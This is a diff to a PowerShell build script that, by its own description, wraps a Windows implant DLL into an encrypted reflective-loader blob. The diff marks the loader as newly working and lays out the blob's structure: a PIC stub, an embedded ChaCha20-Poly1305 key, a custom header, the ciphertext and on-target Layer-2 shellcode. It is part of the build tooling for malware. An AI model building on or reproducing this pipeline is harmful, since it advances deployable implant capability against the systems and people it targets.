@@ -6,13 +6,15 @@
 #   nyx_loader::wrap_payload() with a random LoaderConfig, and writes the blob
 #   to <output_blob>.
 #
-#   STATUS: wrap_payload() currently ALWAYS fails — generate_loader_stub()
-#   returns LoaderError::Layer2Unavailable because the on-target Layer-2
-#   shellcode does not exist. This step therefore fails loudly (no blob is
-#   produced), which is correct fail-closed behavior: the loader capability is
-#   not shippable until a real Layer-2 exists (spec §5.3). When Layer-2 lands,
-#   this step starts producing the blob again and loader_probe_gate.ps1 takes
-#   over verification.
+#   STATUS: the emitter now produces the REAL blob. wrap_payload() encrypts
+#   the DLL (ChaCha20-Poly1305; per-invocation random key baked into the stub,
+#   nonce in the NYX2 header) and assembles the definitive blob layout:
+#
+#     [LAYER1 + bridge][key 32B][NYX2 magic(4) enc_len(4) nonce(12)]
+#     [ciphertext || 16B Poly1305 tag][LAYER2 code]
+#
+#   Verification of the blob is loader_probe_gate.ps1's job (Unicorn emu probe
+#   first, rundll32 harness optional on interactive machines).
 #
 # Input:  crates/implant-win/target/x86_64-pc-windows-msvc/release/nyx_implant_win.dll
 #         (produced by build_prod_dll.ps1)
@@ -67,9 +69,8 @@ try {
     & cargo @cargoArgs 2>&1
     if ($LASTEXITCODE -ne 0) {
         Write-Host "::error::nyx-loader wrap failed (exit $LASTEXITCODE)."
-        Write-Host '::error::Expected while Layer-2 is unimplemented: generate_loader_stub() fails loudly'
-        Write-Host '::error::with LoaderError::Layer2Unavailable, so no reflective blob can be produced.'
-        Write-Host '::error::This is release-blocking by design (see header of this script).'
+        Write-Host '::error::The emitter (nyx_loader::wrap_payload) failed to produce a blob;'
+        Write-Host '::error::inspect the cargo output above. No reflective blob was produced.'
         exit 1
     }
 }
@@ -82,9 +83,9 @@ if (-not (Test-Path $outputBlob)) {
     exit 1
 }
 $size = (Get-Item $outputBlob).Length
-# Sanity: blob must be larger than the DLL (PIC stub + NYX2 header + nonce + tag
-# = ~86 bytes overhead, ciphertext = plaintext len). A blob smaller than the
-# input is a wrap_payload() bug.
+# Sanity: blob must be larger than the DLL (loader stub + 20B NYX2 header +
+# 16B tag = stub + 36 bytes overhead; ciphertext = plaintext len). A blob
+# smaller than the input is a wrap_payload() bug.
 $dllSize = (Get-Item $inputDll).Length
 if ($size -lt $dllSize) {
     Write-Host "::error::blob ($size bytes) is smaller than input DLL ($dllSize bytes) — wrap_payload layout is wrong."
